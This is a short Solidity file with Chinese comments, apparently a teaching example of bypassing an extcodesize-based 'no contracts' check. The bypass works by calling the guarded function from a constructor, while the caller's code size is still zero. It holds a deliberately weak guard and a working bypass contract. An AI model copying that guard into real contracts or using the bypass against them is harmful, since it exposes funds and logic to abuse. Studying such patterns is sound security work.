pragma solidity ^0.8.13;

contract ExitCodeSizeTarget {
    //这个函数依赖extcodesize， 当在构造函数中执行的时候，它会返回0，在构造函数执行完之后才会设置值。
    function isContract(address account) public view returns (bool) {
        uint size;
        assembly{
            size := extcodesize(account)
        }
        return size > 0 ;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract ExitCodeSizeFailedAttack {
    // 直接这样调用是会失败的。
    function pwn(address _target) external {
        ExitCodeSizeTarget(_target).protected();
    }
}


contract ExitCodeSizeHackSuccess {
    bool public isContract;
    address public addr;

    // 当合约被创建的时候， code size（extcodesize）是0。
    // 这样可以饶过 protected里isContract的检查
    constructor(address _target) {
        isContract = ExitCodeSizeTarget(_target).isContract(address(this));
        addr = address(this);
        // 这个能工作
        ExitCodeSizeTarget(_target).protected();

    }
}









